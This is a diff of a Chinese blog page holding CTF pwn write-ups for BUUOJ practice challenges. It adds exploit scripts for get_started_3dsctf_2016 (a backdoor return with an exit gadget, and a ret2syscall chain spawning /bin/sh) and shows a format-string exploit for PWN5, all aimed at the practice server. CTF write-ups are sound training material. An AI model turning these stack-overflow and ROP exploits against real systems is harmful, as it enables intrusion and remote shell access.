@@ -441,6 +441,27 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn5'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"28184"</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x804C044</span>:<span class="number">12345678</span>&#125;)</span><br><span class="line"><span class="comment">#your name:aaaa,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</span></span><br><span class="line"><span class="comment">#Hello,aaaa,fff82d88,63,0,f7fafae0,3,f7f7f410,1,0,1,61616161,2c78252c,252c7825,78252c78,2c78252c</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">"12345678"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
+
+<h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>吐了，弄了一会ret2libc没有做出来，第二次返回到main的时候总是说too long，一查题解发现给了后门，无话可说。。。。。。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./r2t3'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"26861"</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.29_32.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./r2t3'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_addr = 0x8048760</span></span><br><span class="line"><span class="comment"># payload = 0x15 * 'a' + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(260,'a')</span></span><br><span class="line"><span class="comment"># sh.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_addr = u32(sh.recv(4))</span></span><br><span class="line"><span class="comment"># base = puts_addr - libc.sym['puts']</span></span><br><span class="line"><span class="comment"># sys_addr = base + libc.sym['system']</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.recvuntil('name:')</span></span><br><span class="line">payload = <span class="number">0x15</span> * <span class="string">'a'</span> + p32(<span class="number">0x0804858B</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">260</span>,<span class="string">'a'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="get-started-3dsctf-2016-1"><a href="#get-started-3dsctf-2016-1" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>啊这个题，很坑。</p>
+<p>首先是预期解，预期就应该直接调用他的后门对吧，但是在打本地的时候我就打不通，没想明白，在网上找到了大佬的博客，找到了解决方法。</p>
+<p><a href="https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/xlez0w#UiBgQ" target="_blank" rel="noopener">大佬的博客</a></p>
+<p>大佬的方法是强制退出，原因是远程服务器的gets函数没有正常退出，它让程序崩溃，此时无法获取flag，此时使用exit函数使gets函数强制退出。</p>
+<h4 id="方法一exp-backdoor"><a href="#方法一exp-backdoor" class="headerlink" title="方法一exp_backdoor:"></a>方法一exp_backdoor:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ds'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"27757"</span>)</span><br><span class="line">flag_addr = <span class="number">0x080489A0</span></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line">payload = <span class="number">0x38</span> * <span class="string">'a'</span> + p32(flag_addr) + p32(exit_addr) + p32(a1) + p32(a2)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">flag = sh.recv()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法二exp-ret2syscall"><a href="#方法二exp-ret2syscall" class="headerlink" title="方法二exp_ret2syscall:"></a>方法二exp_ret2syscall:</h4><p>常规的ret2syscall</p>
+<p>不过在这里我又遇到了本地打不通远程可以打通的情况，一通baidu+google之后初步判断为Libc问题，对了，我是用到kali。</p>
+<p><a href="https://blog.csdn.net/fjh1997/article/details/105347161" target="_blank" rel="noopener">解决一种pwn本地打不通远程打得通的问题</a></p>
+<p><a href="https://blog.csdn.net/fjh1997/article/details/107695261" target="_blank" rel="noopener">关于jarvisOJ level0远程打得通本地打不通的问题</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ds'</span>)</span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"27757"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ds'</span>)</span><br><span class="line">eax_addr = <span class="number">0x080b91e6</span> </span><br><span class="line">edcb_addr = <span class="number">0x0806fc30</span></span><br><span class="line">gets_plt = <span class="number">0x0804F630</span></span><br><span class="line"><span class="comment">#read_plt = elf.plt['read']</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">print(hex(bss_addr))</span><br><span class="line">int80_addr = <span class="number">0x0806d7e5</span> </span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="number">0x38</span> * <span class="string">'a'</span> + p32(gets_plt) + p32(main_addr) + p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">payload = <span class="number">0x38</span> * <span class="string">'a'</span> + p32(eax_addr) + p32(<span class="number">0xb</span>) + p32(edcb_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(int80_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
           
             <div class='article_footer'>
               
@@ -513,10 +534,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-03T01:31:24+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-04T01:24:00+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>最后更新于：Oct 3, 2020</p>
+    <p>最后更新于：Oct 4, 2020</p>
   </a>
 </div>
 
@@ -590,6 +611,14 @@
         
         
           <div class="prev-next">
+            
+              <a class='prev' href='/2020/10/03/buuoj_crypto/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>buuoj_crypto</p>
+                <p class='content'>encyypto&amp;&amp;decrypto
+
+
+写在前面的话</p>
+              </a>
             
             
               <a class='next' href='/2020/09/29/Stackoverflow/'>
@@ -670,7 +699,7 @@ basic rop64位传参
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-c-1-buuoj"><span class="toc-text">ciscn_2019_c_1 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OGeek2019-babyrop-buuoj"><span class="toc-text">[OGeek2019]babyrop - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level0-buuoj"><span class="toc-text">jarvisoj_level0 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第五空间2019-决赛-PWN5-buuoj"><span class="toc-text">[第五空间2019 决赛]PWN5 - - buuoj</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-c-1-buuoj"><span class="toc-text">ciscn_2019_c_1 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OGeek2019-babyrop-buuoj"><span class="toc-text">[OGeek2019]babyrop - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level0-buuoj"><span class="toc-text">jarvisoj_level0 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第五空间2019-决赛-PWN5-buuoj"><span class="toc-text">[第五空间2019 决赛]PWN5 - - buuoj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-started-3dsctf-2016"><span class="toc-text">get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-started-3dsctf-2016-1"><span class="toc-text">get_started_3dsctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法一exp-backdoor"><span class="toc-text">方法一exp_backdoor:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法二exp-ret2syscall"><span class="toc-text">方法二exp_ret2syscall:</span></a></li></ol></li></ol>
     </div>
   </section>
 
